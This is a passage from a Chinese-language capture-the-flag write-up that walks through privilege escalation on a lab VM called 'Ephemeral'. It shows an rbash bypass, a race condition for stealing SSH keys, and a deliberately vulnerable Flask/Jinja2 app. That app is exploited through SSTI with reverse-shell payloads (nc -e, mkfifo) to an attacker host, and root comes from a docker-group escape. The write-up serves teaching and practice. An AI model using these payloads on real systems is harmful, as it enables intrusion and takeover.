Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.17.0-051700rc7-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

17 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Tue Apr 30 02:40:05 2024 from 192.168.0.143
donald@ephemeral:~$ clear
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
donald@ephemeral:~$ exit
logout
-rbash: /usr/bin/clear_console: restricted: cannot specify `/' in command names
Connection to 192.168.0.148 closed.
                                                                        
┌──(kali💀kali)-[~/temp/Ephemeral]
└─$ ssh donald@192.168.0.148 -t "bash --noprofile"
donald@192.168.0.148's password: 
donald@ephemeral:~$ whoami;id
donald
uid=1004(donald) gid=1004(donald) groups=1004(donald)
```

> **--noprofile**: 这是`bash`的一个选项，用于告诉`bash`不要读取`~/.bash_profile`、`~/.bash_login`、`~/.profile`等初始化文件。这可以加速启动速度，特别是当这些文件中有许多复杂的命令或脚本时。通常，这些初始化文件用于设置环境变量、别名、函数等。

尝试进行竞争：

```bash
donald@ephemeral:/dev/shm$ /usr/bin/ssh-keygen -q -t rsa -N '' -f /dev/shm/jane
donald@ephemeral:/dev/shm$ ls -la
total 8
drwxrwxrwx  2 root   root     80 Apr 30 03:01 .
drwxr-xr-x 19 root   root   3980 Apr 29 23:57 ..
-rw-------  1 donald donald 2602 Apr 30 03:01 jane
-rw-r--r--  1 donald donald  570 Apr 30 03:01 jane.pub
donald@ephemeral:/dev/shm$ while true; do cp /dev/shm/jane /dev/shm/id_rsa; chmod 777 /dev/shm/id_rsa; cp /dev/shm/jane.pub /dev/shm/id_rsa.pub; done
```

```bash
donald@ephemeral:~$ sudo -u jane /usr/local/bin/addKeys.sh 
/dev/shm/id_rsa already exists.
Overwrite (y/n)? n
Keys Added!
Directory Deleted!
.ssh Directory Created!
Keys Copied.
Permissions Changed!
Keys Removed!
```

![image-20240430170318058](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740602.png)

尝试登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740603.png" alt="image-20240430170535474" style="zoom:50%;" />

### jane->randy

信息搜集一下：

```bash
jane@ephemeral:~$ ls -la
total 40
drwx------ 7 jane jane 4096 Apr 30 03:03 .
drwxr-xr-x 6 root root 4096 Mar 15  2022 ..
lrwxrwxrwx 1 root root    9 Mar 15  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jane jane  220 Mar 15  2022 .bash_logout
-rw-r--r-- 1 jane jane 3771 Mar 15  2022 .bashrc
drwx------ 4 jane jane 4096 Mar 16  2022 .cache
drwx------ 4 jane jane 4096 Mar 16  2022 .config
drwxrwxr-x 2 jane jane 4096 Mar 17  2022 Desktop
drwxrwxr-x 4 jane jane 4096 Mar 17  2022 .local
-rw-r--r-- 1 jane jane  807 Mar 15  2022 .profile
drwxrwxr-x 2 jane jane 4096 Apr 30 03:03 .ssh
jane@ephemeral:~$ cd Desktop/
jane@ephemeral:~/Desktop$ ls -la
total 8
drwxrwxr-x 2 jane jane 4096 Mar 17  2022 .
drwx------ 7 jane jane 4096 Apr 30 03:03 ..
jane@ephemeral:~/Desktop$ sudo -l
Matching Defaults entries for jane on ephemeral:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jane may run the following commands on ephemeral:
    (randy) NOPASSWD: /usr/bin/python3 /var/www/html/private_html/app.py
jane@ephemeral:~/Desktop$ cat /var/www/html/private_html/app.py
from flask import Flask, request
from jinja2 import Environment

app = Flask(__name__)
Jinja2 = Environment()

@app.route("/page")
def page():

    name = request.values.get('name')


    output = Jinja2.from_string('Welcome ' + name + '!').render()


    return output

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
```

发现存在`SSTI`漏洞，一个窗口运行，一个窗口尝试各种负载：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740604.png" alt="image-20240430171144673" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740605.png" alt="image-20240430171729001" style="zoom:33%;" />

阔以，继续尝试：

> https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python
>
> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---forcing-output-on-blind-rce

```bash
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740606.png" alt="image-20240430172119959" style="zoom:50%;" />

弹一个shell：

```bash
http://192.168.0.148:5000/page?name={{ joiner.__init__.__globals__.os.popen('busybox nc -e /bin/bash 192.168.0.143 1234').read() }}
http://192.168.0.148:5000/page?name={{ joiner.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.143 1234 >/tmp/f').read() }}
http://192.168.0.148:5000/page?name={{ joiner.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 192.168.0.143 1234 >/tmp/f').read() }}
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740607.png" alt="image-20240430173739191" style="zoom:50%;" />

### randy->root

用户属于`docker`组，尝试进行逃逸：https://gtfobins.github.io/gtfobins/docker/#shell

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740608.png" alt="image-20240430173900132" style="zoom:50%;" />

```bash
(remote) randy@ephemeral:/home/jane$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami;id
root
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4,6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cd /root
# ls -la
total 40
drwx------  4 root root 4096 Mar 18  2022 .
drwxr-xr-x 21 root root 4096 Mar 17  2022 ..
lrwxrwxrwx  1 root root    9 Mar 15  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  3 root root 4096 Mar 17  2022 .cache
drwxr-xr-x  3 root root 4096 Mar 15  2022 .local
-rw-------  1 root root 3672 Mar 16  2022 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   66 Mar 16  2022 .selected_editor
-rw-r--r--  1 root root  247 Mar 16  2022 .wget-hsts
-rw-r--r--  1 root root   33 Mar 17  2022 root.txt
```

拿下rootshell！！！！！

